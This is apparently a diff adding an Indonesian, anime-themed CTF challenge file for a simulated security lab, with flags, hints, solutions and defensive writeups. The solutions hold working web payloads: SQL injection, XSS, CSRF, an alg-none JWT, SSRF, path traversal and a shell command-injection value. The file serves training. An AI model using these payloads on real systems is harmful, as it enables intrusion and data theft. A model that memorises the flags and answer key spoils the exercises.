@@ -1,0 +1,671 @@
+# Lab Cyber & CTF Arena. SEMUA target adalah simulasi buatan sendiri (lihat src/labs/engine.ts); tidak ada sistem asli yang diserang.
+# `flag` hanya ada di sumber ini; output build menyimpan versi ter-obfuscate + hash SHA-256.
+# `solution` dijalankan saat build untuk membuktikan setiap flag benar-benar bisa didapat.
+# kind: web | html | terminal | crypto | hash | crackme | packets | osint
+
+# ================= WEB =================
+- id: web-robots
+  title: Peta yang Tercecer
+  cat: web
+  points: 50
+  kind: web
+  chapter: m4
+  story: Situs resmi Kisatsutai terlihat kosong. Tapi pengembang ceroboh sering meninggalkan petunjuk untuk mesin pencari.
+  task: Temukan berkas cadangan lama di situs simulasi ini.
+  hints:
+    - "Mesin pencari membaca satu berkas standar di akar situs."
+    - "Buka /robots.txt."
+    - "Ikuti direktori yang ditandai \"Disallow\"."
+  config: { app: robots-cadangan, start: { method: GET, url: / } }
+  flag: SLAYER{robots_bukan_pengaman}
+  solution: [{ url: /robots.txt }, { url: /cadangan-lama/ }, { url: /cadangan-lama/db-2019.sql.bak }]
+  writeup: robots.txt hanya permintaan sopan untuk crawler, bukan kontrol akses. Direktori sensitif harus dilindungi autentikasi atau tidak dipublikasikan sama sekali.
+- id: web-sqli-login
+  title: Gerbang Markas
+  cat: web
+  points: 100
+  kind: web
+  chapter: m1
+  story: Form login Markas menyusun query SQL dengan menyambung string. Header X-Debug-SQL bahkan memperlihatkan query-nya.
+  task: Masuk sebagai Oyakata tanpa mengetahui kata sandinya.
+  hints:
+    - "Lihat header X-Debug-SQL setelah login gagal."
+    - "Tanda petik ' di input mengakhiri string SQL."
+    - "Coba user = oyakata'-- (komentar -- membuang sisa query)."
+  config: { app: sqli-login, start: { method: POST, url: /login, body: user=tanjiro&pass=salah } }
+  flag: SLAYER{petik_satu_membuka_gerbang}
+  solution: [{ method: POST, url: /login, body: "user=oyakata'--&pass=x" }]
+  writeup: Input user ikut menjadi bagian kode SQL. Perbaikan yang benar adalah prepared statement (parameter ?), bukan sekadar menyaring tanda petik.
+  fix: |
+    db.prepare("SELECT nama, peran FROM akun WHERE user = ? AND pass = ?").get(user, hash(pass))
+- id: web-sqli-union
+  title: Gulungan Terlarang
+  cat: web
+  points: 150
+  kind: web
+  chapter: m1
+  story: Pencarian slayer menampilkan dua kolom. Di database yang sama ada tabel gulungan_terlarang.
+  task: Gunakan UNION untuk menampilkan isi tabel gulungan_terlarang lewat pencarian.
+  hints:
+    - "Query-nya SELECT nama, napas ... LIKE '%q%'."
+    - "UNION SELECT harus punya jumlah kolom yang sama (2)."
+    - "Tutup string dan beri komentar: ' UNION SELECT isi, 1 FROM gulungan_terlarang--"
+  config: { app: sqli-union, start: { method: GET, url: /cari?q=tan } }
+  flag: SLAYER{union_dua_kolom}
+  solution: [{ url: "/cari?q=' UNION SELECT isi, 1 FROM gulungan_terlarang--" }]
+  writeup: UNION menggabungkan hasil query kedua ke hasil pertama. Dengan parameter terikat, input selamanya diperlakukan sebagai data.
+- id: web-idor
+  title: Surat yang Salah Alamat
+  cat: web
+  points: 100
+  kind: web
+  chapter: m3
+  story: Kamu login sebagai Tanjiro. API surat hanya memeriksa apakah kamu login, bukan apakah suratnya milikmu.
+  task: Baca surat yang ditujukan untuk para Hashira.
+  hints:
+    - "Suratmu bernomor 1043 dan 1044."
+    - "Nomor surat berurutan."
+    - "Coba GET /api/surat/1041."
+  config: { app: idor-surat, start: { method: GET, url: /api/surat/1043, cookie: sesi=tanjiro-7f3a } }
+  flag: SLAYER{cek_kepemilikan_bukan_login}
+  solution: [{ url: /api/surat/1041, cookie: sesi=tanjiro-7f3a }]
+  writeup: IDOR (Insecure Direct Object Reference) — otorisasi harus memeriksa bahwa objek memang milik user, misalnya WHERE id = ? AND pemilik = user_sesi.
+- id: web-cookie
+  title: Haori Pinjaman
+  cat: web
+  points: 100
+  kind: web
+  chapter: m4
+  story: Peranmu disimpan di cookie profil sebagai base64 dari JSON, tanpa tanda tangan.
+  task: Masuk ke /ruang-pilar.
+  hints:
+    - "Decode nilai cookie profil dengan base64."
+    - "Ubah peran menjadi hashira lalu encode ulang."
+    - "Kirim cookie baru ke GET /ruang-pilar."
+  config: { app: cookie-peran, start: { method: GET, url: / } }
+  flag: SLAYER{jangan_percaya_cookie_klien}
+  solution: [{ url: /ruang-pilar, cookie: "profil=eyJ1c2VyIjoiemVuaXRzdSIsInBlcmFuIjoiaGFzaGlyYSJ9" }]
+  writeup: Data yang disimpan di klien bisa diubah. Simpan sesi di server, atau tanda tangani (HMAC) dan verifikasi setiap request.
+- id: web-jwt
+  title: Tanda Tangan Kosong
+  cat: web
+  points: 200
+  kind: web
+  chapter: m4
+  story: Server menerima JWT. Sayangnya pustakanya juga menerima alg "none".
+  task: Buka /admin.
+  hints:
+    - "JWT = header.payload.signature dalam base64url."
+    - "Ubah header menjadi {\"alg\":\"none\"} dan payload admin true."
+    - "Tanda tangan boleh kosong, tapi titik terakhir tetap ada: header.payload."
+  config: { app: jwt-none, start: { method: GET, url: / } }
+  flag: SLAYER{alg_none_bukan_tanda_tangan}
+  solution: [{ url: /admin, headers: { Authorization: "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJpbm9zdWtlIiwiYWRtaW4iOnRydWV9." } }]
+  writeup: Selalu tetapkan algoritma yang diharapkan di sisi server (allowlist) dan tolak alg none.
+- id: web-ssrf
+  title: Gagak Pengintip
+  cat: web
+  points: 150
+  kind: web
+  chapter: m4
+  story: Layanan pratinjau tautan mengambil URL apa pun untukmu, kecuali yang mengandung kata intranet atau localhost.
+  task: Baca /rahasia di server intranet.
+  hints:
+    - "Cari tahu alamat lain server intranet."
+    - "Pratinjau http://berita.desa/ dulu."
+    - "Pakai alamat IP-nya."
+  config: { app: ssrf-pratinjau, start: { method: GET, url: "/pratinjau?url=http://berita.desa/" } }
+  flag: SLAYER{blacklist_selalu_bocor}
+  solution: [{ url: "/pratinjau?url=http://10.0.0.7/rahasia" }]
+  writeup: Filter daftar hitam string mudah diakali (IP, desimal, redirect). Gunakan allowlist host tujuan dan blokir rentang IP internal setelah resolusi DNS.
+- id: web-path
+  title: Jalan Mundur
+  cat: web
+  points: 100
+  kind: web
+  chapter: m5
+  story: Unduhan dokumen menyambung nama file ke /srv/dokumen/ tanpa pemeriksaan.
+  task: Ambil kunci.txt dari /srv/rahasia/.
+  hints:
+    - ".. berarti naik satu direktori."
+    - "Dari /srv/dokumen/ naik ke /srv/."
+    - "file=../rahasia/kunci.txt"
+  config: { app: path-unduh, start: { method: GET, url: /unduh?file=laporan.txt } }
+  flag: SLAYER{titik_titik_garis_miring}
+  solution: [{ url: /unduh?file=../rahasia/kunci.txt }]
+  writeup: Normalisasi path lalu pastikan hasilnya masih di dalam direktori yang diizinkan (atau pakai daftar ID dokumen, bukan nama file).
+- id: web-mass
+  title: Pendaftar Kilat
+  cat: web
+  points: 150
+  kind: web
+  chapter: m5
+  story: API pendaftaran menyalin seluruh isi JSON ke akun baru. Peran bawaan akun baru adalah kakushi.
+  task: Daftarkan akun yang langsung berperan hashira.
+  hints:
+    - "Lihat field apa saja yang ada di respons pendaftaran."
+    - "Kamu bisa mengirim field tambahan."
+    - "Body: {\"user\":\"a\",\"pass\":\"b\",\"peran\":\"hashira\"}"
+  config: { app: mass-assign, start: { method: POST, url: /api/daftar, body: "{\"user\":\"murata\",\"pass\":\"rahasia\"}" } }
+  flag: SLAYER{allowlist_field_input}
+  solution: [{ method: POST, url: /api/daftar, body: "{\"user\":\"murata\",\"pass\":\"x\",\"peran\":\"hashira\"}" }]
+  writeup: Ambil hanya field yang diizinkan dari input (user, pass); field sensitif seperti peran ditentukan server.
+- id: web-cmd
+  title: Ping Terkutuk
+  cat: web
+  points: 200
+  kind: web
+  chapter: m5
+  story: Alat ping menjalankan "ping -c 1 " + host di shell server (simulasi). Ada flag.txt di direktori kerja server.
+  task: Baca flag.txt lewat parameter host.
+  hints:
+    - "Shell menjalankan beberapa perintah yang dipisah titik koma (;)."
+    - "Tambahkan perintah kedua setelah alamat."
+    - "host=8.8.8.8;cat flag.txt (encode ; dan spasi menjadi %3B dan %20 bila perlu)"
+  config: { app: cmd-ping, start: { method: GET, url: /ping?host=8.8.8.8 } }
+  flag: SLAYER{titik_koma_maut}
+  solution: [{ url: "/ping?host=127.0.0.1%3Bcat%20flag.txt" }]
+  writeup: Jangan menyusun perintah shell dari input. Panggil program dengan daftar argumen (execFile/subprocess tanpa shell) dan validasi host.
+
+# ================= XSS / CSRF (iframe sandbox) =================
+- id: xss-cari
+  title: Pantulan Kata Kunci
+  cat: web
+  points: 100
+  kind: html
+  chapter: m2
+  story: Halaman pencarian Arsip menampilkan kata kunci tanpa di-escape.
+  task: Jalankan alert() di halaman korban.
+  hints:
+    - "Input masuk langsung ke HTML."
+    - "Tag script ikut dirender."
+    - "<script>alert(1)</script>"
+  config: { app: xss-cari }
+  flag: SLAYER{escape_sebelum_render}
+  solution: <script>alert(document.domain)</script>
+  writeup: Reflected XSS. Escape karakter HTML (& < > " ') saat menampilkan input, dan pasang Content-Security-Policy.
+- id: xss-bukutamu
+  title: Filter Bocor
+  cat: web
+  points: 150
+  kind: html
+  chapter: m2
+  story: Buku tamu menyaring tag <script>, tetapi hanya sekali dan tanpa membedakan huruf besar/kecil.
+  task: Jalankan alert() di buku tamu.
+  hints:
+    - "Filter hanya menghapus kemunculan pertama."
+    - "Apa jadinya jika penghapusan justru membentuk tag baru?"
+    - "<scr<script>ipt>alert(1)</script>"
+  config: { app: xss-bukutamu }
+  flag: SLAYER{filter_bukan_escape}
+  solution: <scr<script>ipt>alert(1)</script>
+  writeup: Menyaring pola berbahaya selalu tertinggal satu langkah. Escape output sesuai konteks (HTML, atribut, URL, JS).
+- id: xss-dom
+  title: Bayangan di Fragmen
+  cat: web
+  points: 200
+  kind: html
+  chapter: m2
+  story: Kartu sambutan memasang nama dari URL dengan innerHTML. Tag script yang dipasang lewat innerHTML tidak dijalankan, tapi atribut event tetap jalan.
+  task: Jalankan alert() lewat nama.
+  hints:
+    - "innerHTML tidak mengeksekusi <script>."
+    - "Atribut seperti onerror atau onload dijalankan browser."
+    - "<img src=x onerror=alert(1)>"
+  config: { app: xss-dom }
+  flag: SLAYER{textcontent_lebih_aman}
+  solution: <img src=x onerror=alert(1)>
+  writeup: DOM XSS. Pakai textContent untuk teks biasa, atau sanitizer (DOMPurify) bila memang perlu HTML.
+- id: csrf-bank
+  title: Transfer Diam-diam
+  cat: web
+  points: 200
+  kind: html
+  chapter: m3
+  story: Bank Desa memproses transfer dari browser yang sedang login tanpa token CSRF.
+  task: Buat halaman jebakan yang otomatis mengirim POST transfer ke akun akatsuki saat dibuka bot korban.
+  hints:
+    - "Gunakan form dengan method post ke https://bank.desa/transfer."
+    - "Field: ke=akatsuki, jumlah=1000."
+    - "Kirim otomatis dengan document.forms[0].submit()."
+  config: { app: csrf-transfer }
+  flag: SLAYER{token_csrf_wajib}
+  solution: '<form action="https://bank.desa/transfer" method="post"><input name="ke" value="akatsuki"><input name="jumlah" value="1000"></form><script>document.forms[0].submit()</script>'
+  writeup: Lindungi aksi yang mengubah data dengan token CSRF per sesi dan cookie SameSite=Lax/Strict.
+
+# ================= FORENSIK & LINUX (terminal) =================
+- id: for-tersembunyi
+  title: Berkas Bertitik
+  cat: forensics
+  points: 50
+  kind: terminal
+  chapter: f4
+  story: Kakushi bilang ada catatan rahasia di folder home, tapi ls tidak memperlihatkan apa pun.
+  task: Temukan dan baca catatannya. Isinya di-encode.
+  hints:
+    - "File yang namanya diawali titik tersembunyi."
+    - "ls -la"
+    - "base64 -d"
+  config: { files: { 'catatan.txt': "Tidak ada apa-apa di sini.\n", '.titipan': "U0xBWUVSe2xzX2FfbWVueWluZ2thcF9yYWhhc2lhfQ==\n" } }
+  flag: SLAYER{ls_a_menyingkap_rahasia}
+  solution: ls -a && base64 -d .titipan
+  writeup: File tersembunyi bukan pengaman. Base64 adalah encoding, bukan enkripsi.
+- id: for-authlog
+  title: Pintu Diketuk Berulang
+  cat: forensics
+  points: 100
+  kind: terminal
+  chapter: m6
+  story: auth.log penuh percobaan login gagal. Flag-nya adalah IP penyerang yang paling sering gagal, dalam format SLAYER{ip}.
+  task: Analisis /var/log/auth.log.
+  hints:
+    - "grep \"Failed password\""
+    - "Ambil kolom IP dengan awk."
+    - "sort | uniq -c | sort -rn"
+  config:
+    files:
+      /var/log/auth.log: |
+        Nov  5 09:00:01 markas sshd[100]: Accepted password for slayer from 10.0.0.5 port 50000
+        Nov  5 09:01:10 markas sshd[101]: Failed password for root from 10.6.6.6 port 51000
+        Nov  5 09:01:12 markas sshd[102]: Failed password for root from 10.6.6.6 port 51001
+        Nov  5 09:01:15 markas sshd[103]: Failed password for admin from 10.4.4.4 port 52000
+        Nov  5 09:01:18 markas sshd[104]: Failed password for root from 10.6.6.6 port 51002
+        Nov  5 09:02:00 markas sshd[105]: Failed password for slayer from 10.4.4.4 port 52001
+        Nov  5 09:02:30 markas sshd[106]: Failed password for root from 10.6.6.6 port 51003
+        Nov  5 09:03:00 markas sshd[107]: Accepted password for kanao from 10.0.0.9 port 53000
+  flag: SLAYER{10.6.6.6}
+  solution: grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -1 | awk '{print "SLAYER{"$2"}"}'
+  writeup: Analisis log = pipeline teks. Pertahanan nyata - fail2ban, login berbasis kunci, nonaktifkan login root.
+- id: for-strings
+  title: Gambar Bersuara
+  cat: forensics
+  points: 100
+  kind: terminal
+  chapter: m6
+  story: foto.png ini bukan sekadar gambar. Ada teks yang terselip di antara byte-byte-nya.
+  task: Temukan teks tersembunyi di dalam berkas.
+  hints:
+    - "cat menampilkan sampah biner."
+    - "Perintah strings menampilkan rangkaian karakter yang terbaca."
+    - "strings foto.png | grep SLAYER"
+  config: { files: { 'foto.png': "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01\x00\x01\x00\x08\x02\x00\x00\x00\x00\x00\x00tEXtComment\x00SLAYER{strings_melihat_isi}\x00\x00\x00\x00IEND\xaeB`\x82" } }
+  flag: SLAYER{strings_melihat_isi}
+  solution: strings foto.png | grep SLAYER
+  writeup: Metadata dan chunk teks di berkas gambar sering membocorkan informasi; bersihkan metadata sebelum berbagi.
+- id: for-perm
+  title: Laci yang Lupa Dikunci
+  cat: forensics
+  points: 150
+  kind: terminal
+  chapter: f4
+  story: Di /opt/arsip ada puluhan berkas milik root. Hampir semua aman (600), tetapi satu berkas bisa dibaca siapa saja.
+  task: Temukan berkas yang bisa dibaca semua user.
+  hints:
+    - "find punya opsi -perm."
+    - "-perm -o=r atau -perm -004"
+    - "find /opt/arsip -type f -perm -o=r"
+  config:
+    files:
+      /opt/arsip/a1.txt: { content: "x\n", mode: '600', owner: root }
+      /opt/arsip/a2.txt: { content: "x\n", mode: '600', owner: root }
+      /opt/arsip/b7.txt: { content: "SLAYER{chmod_600_untuk_rahasia}\n", mode: '644', owner: root }
+      /opt/arsip/c3.txt: { content: "x\n", mode: '600', owner: root }
+      /opt/arsip/d4.txt: { content: "x\n", mode: '640', owner: root }
+  flag: SLAYER{chmod_600_untuk_rahasia}
+  solution: cat $(find /opt/arsip -type f -perm -o=r)
+  writeup: Prinsip least privilege - rahasia cukup 600 (hanya pemilik). Audit berkala dengan find -perm.
+- id: for-proses
+  title: Proses Penyusup
+  cat: forensics
+  points: 150
+  kind: terminal
+  chapter: f4
+  story: Server terasa lambat. Ada proses aneh yang membawa token di argumennya.
+  task: Temukan token di daftar proses.
+  hints:
+    - "ps aux menampilkan semua proses lengkap dengan argumen."
+    - "Cari yang tidak biasa."
+    - "ps aux | grep -i token"
+  config:
+    files: {}
+    procs:
+      - { pid: 1, user: root, cmd: /sbin/init }
+      - { pid: 412, user: root, cmd: /usr/sbin/sshd -D }
+      - { pid: 1337, user: slayer, cmd: "/tmp/.k/penambang --token=SLAYER{ps_aux_melihat_semua}" }
+  flag: SLAYER{ps_aux_melihat_semua}
+  solution: ps aux | grep -o 'SLAYER{[^}]*}'
+  writeup: Rahasia di argumen proses terlihat oleh user lain lewat ps. Kirim rahasia lewat environment/berkas dengan permission ketat.
+- id: for-hex
+  title: Catatan Heksadesimal
+  cat: forensics
+  points: 100
+  kind: terminal
+  chapter: m6
+  story: Dump memori kecil disimpan sebagai teks heksadesimal.
+  task: Ubah kembali menjadi teks.
+  hints:
+    - "xxd bisa membalik hex dump."
+    - "xxd -r -p mengubah hex polos ke byte."
+    - "xxd -r -p dump.hex"
+  config: { files: { 'dump.hex': "534c415945527b7878645f725f707d0a\n" } }
+  flag: SLAYER{xxd_r_p}
+  solution: xxd -r -p dump.hex
+  writeup: Hex, base64, dan URL-encoding sering muncul di forensik. Kenali bentuknya.
+- id: for-cari
+  title: Jarum di Tumpukan Jerami
+  cat: forensics
+  points: 100
+  kind: terminal
+  chapter: f4
+  story: Ribuan baris laporan tersebar di banyak folder. Salah satunya berisi flag.
+  task: Cari flag di seluruh folder laporan.
+  hints:
+    - "grep bisa mencari rekursif."
+    - "grep -r"
+    - "grep -r SLAYER laporan/"
+  config:
+    files:
+      laporan/2024/januari.txt: "Patroli aman.\nTidak ada iblis.\n"
+      laporan/2024/februari.txt: "Hujan seharian.\n"
+      laporan/2025/maret/minggu1.txt: "Latihan Total Concentration.\n"
+      laporan/2025/maret/minggu3.txt: "Catatan Gagak: SLAYER{grep_r_menjelajah}\n"
+      laporan/2025/april.txt: "Libur.\n"
+  flag: SLAYER{grep_r_menjelajah}
+  solution: grep -rho 'SLAYER{[^}]*}' laporan/
+  writeup: grep -r, find, dan pipeline adalah alat utama analis.
+- id: for-cron
+  title: Jadwal Mencurigakan
+  cat: forensics
+  points: 150
+  kind: terminal
+  chapter: m6
+  story: Penyerang menanam persistensi lewat crontab sistem. Perintahnya di-encode base64.
+  task: Baca /etc/crontab dan decode muatannya.
+  hints:
+    - "cat /etc/crontab"
+    - "Ambil bagian setelah echo."
+    - "Decode dengan base64 -d."
+  config:
+    files:
+      /etc/crontab: |
+        # m h dom mon dow user command
+        17 * * * * root cd / && run-parts --report /etc/cron.hourly
+        */5 * * * * root echo U0xBWUVSe2Nyb250YWJfcGVyc2lzdGVuc2l9 | base64 -d > /dev/null
+  flag: SLAYER{crontab_persistensi}
+  solution: grep -o 'echo [A-Za-z0-9=]*' /etc/crontab | cut -d' ' -f2 | base64 -d
+  writeup: Periksa crontab, systemd timer, dan skrip startup saat mencari persistensi penyerang.
+
+# ================= KRIPTOGRAFI =================
+- id: cr-caesar
+  title: Surat Kaisar
+  cat: crypto
+  points: 50
+  kind: crypto
+  chapter: f6
+  story: Gagak membawa surat yang hurufnya digeser.
+  task: Pecahkan sandinya dengan Cipher Playground.
+  hints:
+    - "Caesar menggeser setiap huruf sejauh k."
+    - "Ada 25 kemungkinan saja."
+    - "Coba k = 3."
+  config: { cipher: "VODBHU{jhvhu_wljd}", tools: [caesar, rot13] }
+  flag: SLAYER{geser_tiga}
+  solution: [{ op: caesar, p: '3' }]
+  writeup: Caesar bisa dipecah brute force (25 kunci) atau analisis frekuensi. Ini bukan enkripsi modern.
+- id: cr-base64
+  title: Berlapis-lapis
+  cat: crypto
+  points: 50
+  kind: crypto
+  chapter: f6
+  story: Pesan ini dibungkus beberapa lapis encoding.
+  task: Kupas lapisannya satu per satu.
+  hints:
+    - "Huruf, angka, + / dan = di akhir: tanda base64."
+    - "Hasil decode pertama masih terlihat seperti base64?"
+    - "Decode base64 dua kali lalu ROT13."
+  config: { cipher: "UmxsT1RGSkZlM0poY0dKeGRtRjBYMjlvZUc1aFgzSmhlR1YyWTJaMmZRPT0=", tools: [b64d, rot13, hexd, reverse] }
+  flag: SLAYER{encoding_bukan_enkripsi}
+  solution: [{ op: b64d }, { op: b64d }, { op: rot13 }]
+  writeup: Encoding (base64, hex, ROT13) tidak punya kunci; siapa pun bisa membaliknya.
+- id: cr-vigenere
+  title: Kunci Pernapasan
+  cat: crypto
+  points: 150
+  kind: crypto
+  chapter: m6
+  story: Pesan disandi Vigenère. Kuncinya nama gaya pernapasan Tanjiro (huruf kecil, tanpa spasi).
+  task: Dekripsi dengan Vigenère.
+  hints:
+    - "Tanjiro memakai Napas Air (dan Hinokami Kagura)."
+    - "Kunci dalam bahasa Indonesia."
+    - "kunci = air"
+  config: { cipher: "STRYMI{vqxevvrm_sublh_slnkz}", tools: [vigenere, caesar] }
+  flag: SLAYER{vigenere_butuh_kunci}
+  solution: [{ op: vigenere, p: air }]
+  writeup: Vigenère memakai kunci berulang. Lemah terhadap analisis Kasiski bila kuncinya pendek.
+- id: cr-xor
+  title: Satu Byte Rahasia
+  cat: crypto
+  points: 150
+  kind: crypto
+  chapter: l1
+  story: Pesan heksadesimal di-XOR dengan satu byte kunci yang tidak diketahui.
+  task: Temukan kuncinya (0–255) dan baca pesannya.
+  hints:
+    - "Flag selalu diawali SLAYER{."
+    - "S (0x53) XOR kunci = byte pertama (0x35)."
+    - "kunci = 0x53 XOR 0x35 = 102"
+  config: { cipher: "352a273f23341d1e091439040314130a070801390a030b070e1b", tools: [xor, hexd] }
+  flag: SLAYER{xor_berulang_lemah}
+  solution: [{ op: xor, p: '102' }]
+  writeup: Known-plaintext attack - mengetahui sebagian isi (SLAYER{) cukup untuk menemukan kunci XOR pendek.
+- id: cr-md5
+  title: Kata Sandi Lemah
+  cat: crypto
+  points: 100
+  kind: hash
+  chapter: f7
+  story: Database bocor berisi hash MD5 tanpa salt. Wordlist kecil tersedia.
+  task: Temukan kata sandi asli; flag = SLAYER{katasandi}.
+  hints:
+    - "Hash setiap kata di wordlist lalu bandingkan."
+    - "MD5 tanpa salt bisa dicari di tabel."
+    - "Gunakan tombol \"Coba wordlist\"."
+  config: { algo: md5, hash: dcd91495d580a37aaf45e3955a4c5e76, wordlist: [tanjiro, nezuko123, zenitsu, inosuke, rahasia, kamado, hinokami, password] }
+  flag: SLAYER{hinokami}
+  solution: hinokami
+  writeup: Simpan kata sandi dengan bcrypt/argon2 (lambat + salt). MD5/SHA polos mudah di-crack dengan wordlist.
+- id: cr-sha
+  title: Sidik Jari Bocor
+  cat: crypto
+  points: 150
+  kind: hash
+  chapter: f7
+  story: Hash SHA-256 tanpa salt dari PIN 4 digit.
+  task: Temukan PIN-nya; flag = SLAYER{pin}.
+  hints:
+    - "Hanya ada 10.000 kemungkinan PIN."
+    - "Gunakan tombol \"Coba semua PIN 0000–9999\"."
+    - "SHA-256 cepat, jadi brute force PIN instan."
+  config: { algo: sha256, hash: 0b94cd5e95afb17f118c0ed090fa2621bae55c692e2f7b13948c7d805985974e, pins: true }
+  flag: SLAYER{4271}
+  solution: '4271'
+  writeup: Ruang kunci kecil (PIN, tanggal lahir) bisa di-brute force meski hash-nya kuat. Tambahkan salt + algoritma lambat + batas percobaan.
+- id: cr-hex-rev
+  title: Cermin Heksa
+  cat: crypto
+  points: 100
+  kind: crypto
+  chapter: l1
+  story: Pesan hex ini dibalik urutannya sebelum di-encode.
+  task: Decode lalu balik.
+  hints:
+    - "Hex decode dulu."
+    - "Hasilnya terbaca terbalik."
+    - "Gunakan alat \"Balik string\"."
+  config: { cipher: "7d616361625f757261625f756c75645f6b696c61627b524559414c53", tools: [hexd, reverse, b64d] }
+  flag: SLAYER{balik_dulu_baru_baca}
+  solution: [{ op: hexd }, { op: reverse }]
+  writeup: Transformasi berlapis tanpa kunci tetap bisa dibalik dengan sabar.
+
+# ================= REVERSE ENGINEERING =================
+- id: rev-balik
+  title: Kunci Terbalik
+  cat: rev
+  points: 50
+  kind: crackme
+  chapter: l1
+  story: Program pemeriksa kunci ini terlalu jujur.
+  task: Baca kodenya dan temukan kunci yang diterima. Flag = SLAYER{kunci}.
+  hints:
+    - "Ikuti apa yang dilakukan pada input."
+    - "split-reverse-join membalik string."
+    - "Balik string pembandingnya."
+  config:
+    code: |
+      function periksa(kunci) {
+        const dibalik = kunci.split('').reverse().join('')
+        return dibalik === 'arihsah_idajnem'
+      }
+  flag: SLAYER{menjadi_hashira}
+  solution: menjadi_hashira
+  writeup: Pemeriksaan di sisi klien selalu bisa dibaca. Logika rahasia harus di server.
+- id: rev-xor
+  title: Gembok Bitwise
+  cat: rev
+  points: 150
+  kind: crackme
+  chapter: l1
+  story: Setiap huruf kunci di-XOR dengan 7 lalu dibandingkan dengan deret angka.
+  task: Hitung kunci yang benar. Flag = SLAYER{kunci}.
+  hints:
+    - "XOR bisa dibalik dengan XOR yang sama."
+    - "Untuk setiap angka n, huruf = String.fromCharCode(n ^ 7)."
+    - "Hasilnya nama lengkap tokoh utama (huruf kecil, pakai _)."
+  config:
+    code: |
+      function periksa(kunci) {
+        const target = [108, 102, 106, 102, 99, 104, 88, 115, 102, 105, 109, 110, 117, 104]
+        if (kunci.length !== target.length) return false
+        for (let i = 0; i < kunci.length; i++) if ((kunci.charCodeAt(i) ^ 7) !== target[i]) return false
+        return true
+      }
+  flag: SLAYER{kamado_tanjiro}
+  solution: kamado_tanjiro
+  writeup: Operasi yang bisa dibalik (XOR, penjumlahan) tidak menyembunyikan apa pun.
+- id: rev-asm
+  title: Gulungan Assembly
+  cat: rev
+  points: 200
+  kind: crackme
+  chapter: l1
+  story: Fungsi berikut diterjemahkan dari assembly x86 sederhana. Kunci adalah angka yang membuat eax akhir = 0.
+  task: Hitung angka kuncinya. Flag = SLAYER{angka}.
+  hints:
+    - "Ikuti register: eax = kunci; eax *= 3; eax += 7; eax ^= 0x55."
+    - "Agar hasil akhir 0 maka eax sebelum XOR = 0x55 = 85."
+    - "3k + 7 = 85, jadi k = 26"
+  config:
+    code: |
+      // mov eax, [kunci] ; imul eax, 3 ; add eax, 7 ; xor eax, 0x55 ; test eax, eax ; sete al
+      function periksa(kunci) {
+        let eax = Number(kunci)
+        eax = eax * 3
+        eax = eax + 7
+        eax = eax ^ 0x55
+        return Number.isInteger(Number(kunci)) && eax === 0
+      }
+  flag: SLAYER{26}
+  solution: '26'
+  writeup: Membaca assembly = menelusuri register langkah demi langkah, lalu membalik persamaannya.
+
+# ================= MISC: paket jaringan & OSINT =================
+- id: pk-basic
+  title: Kredensial Telanjang
+  cat: misc
+  points: 100
+  kind: packets
+  chapter: f5
+  story: Rekaman lalu lintas jaringan Markas. Seseorang login ke panel admin lewat HTTP biasa dengan Basic Auth.
+  task: Temukan kredensialnya. Flag ada di kata sandi.
+  hints:
+    - "Filter http."
+    - "Cari header Authorization Basic."
+    - "Decode base64 setelah kata Basic."
+  config:
+    packets:
+      - { no: 1, t: '0.000', src: 10.0.0.5, dst: 10.0.0.1, proto: DNS, info: Standard query A panel.markas }
+      - { no: 2, t: '0.002', src: 10.0.0.1, dst: 10.0.0.5, proto: DNS, info: Standard query response A 10.0.0.20 }
+      - { no: 3, t: '0.010', src: 10.0.0.5, dst: 10.0.0.20, proto: TCP, info: "51544 → 80 [SYN]" }
+      - { no: 4, t: '0.011', src: 10.0.0.20, dst: 10.0.0.5, proto: TCP, info: "80 → 51544 [SYN, ACK]" }
+      - { no: 5, t: '0.013', src: 10.0.0.5, dst: 10.0.0.20, proto: HTTP, info: GET /admin HTTP/1.1, data: "GET /admin HTTP/1.1\r\nHost: panel.markas\r\nAuthorization: Basic dWJ1eWFzaGlraTpTTEFZRVJ7aHR0cHNfd2FqaWJ9\r\n\r\n" }
+      - { no: 6, t: '0.020', src: 10.0.0.20, dst: 10.0.0.5, proto: HTTP, info: HTTP/1.1 200 OK }
+  flag: SLAYER{https_wajib}
+  solution: { packet: 5, ops: [{ op: b64d }], pick: "dWJ1eWFzaGlraTpTTEFZRVJ7aHR0cHNfd2FqaWJ9" }
+  writeup: HTTP tanpa TLS bisa disadap siapa pun di jaringan yang sama. Selalu HTTPS.
+- id: pk-dns
+  title: Bisikan lewat DNS
+  cat: misc
+  points: 150
+  kind: packets
+  chapter: m5
+  story: Malware mencuri data dengan menyelipkannya di nama subdomain kueri DNS (hex).
+  task: Gabungkan potongan hex dari kueri ke domain bocor.contoh lalu decode.
+  hints:
+    - "Filter dns."
+    - "Ambil label pertama setiap kueri ke bocor.contoh sesuai urutan."
+    - "Gabungkan lalu Hex decode."
+  config:
+    packets:
+      - { no: 1, t: '0.0', src: 10.0.0.66, dst: 10.0.0.1, proto: DNS, info: Standard query A 534c4159.bocor.contoh }
+      - { no: 2, t: '0.4', src: 10.0.0.66, dst: 10.0.0.1, proto: DNS, info: Standard query A www.google.com }
+      - { no: 3, t: '0.9', src: 10.0.0.66, dst: 10.0.0.1, proto: DNS, info: Standard query A 45527b64.bocor.contoh }
+      - { no: 4, t: '1.3', src: 10.0.0.66, dst: 10.0.0.1, proto: DNS, info: Standard query A 6e735f65.bocor.contoh }
+      - { no: 5, t: '1.8', src: 10.0.0.66, dst: 10.0.0.1, proto: DNS, info: Standard query A 6b736669.bocor.contoh }
+      - { no: 6, t: '2.2', src: 10.0.0.66, dst: 10.0.0.1, proto: DNS, info: Standard query A 6c7d.bocor.contoh }
+  flag: SLAYER{dns_eksfil}
+  solution: { join: "534c415945527b646e735f656b7366696c7d", ops: [{ op: hexd }] }
+  writeup: DNS sering diizinkan keluar firewall, sehingga dipakai untuk eksfiltrasi. Pantau kueri dengan label panjang/acak.
+- id: os-gagak
+  title: Gagak Tersesat
+  cat: misc
+  points: 100
+  kind: osint
+  chapter: l2
+  story: Kasus fiktif. Seekor gagak pengantar pesan hilang. Pemiliknya, akun @kakushi_goto, sering membagikan foto.
+  task: Dari berkas kasus, tentukan nama desa tempat foto terakhir diambil. Flag = SLAYER{nama_desa} (huruf kecil).
+  hints:
+    - "Baca semua postingan."
+    - "Foto terakhir punya metadata."
+    - "Koordinat di EXIF cocok dengan salah satu desa di peta."
+  config:
+    docs:
